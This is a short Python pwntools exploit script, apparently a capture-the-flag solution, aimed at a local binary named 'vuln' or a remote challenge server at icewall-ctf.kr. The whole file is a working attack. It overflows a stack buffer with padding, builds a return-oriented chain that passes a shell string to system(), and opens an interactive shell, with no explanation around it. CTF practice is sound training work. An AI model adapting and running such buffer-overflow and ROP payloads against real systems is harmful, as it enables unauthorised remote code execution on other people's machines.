from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10201)

system_plt = 0x400570
pop_rdi_ret = 0x4007F3
ret = 0x400551
sh_str = 0x400814

payload = 'A'*(0x10+8)
payload += p64(pop_rdi_ret)
payload += p64(sh_str)
payload += p64(ret)
payload += p64(system_plt)

p.sendline(payload)

p.interactive()
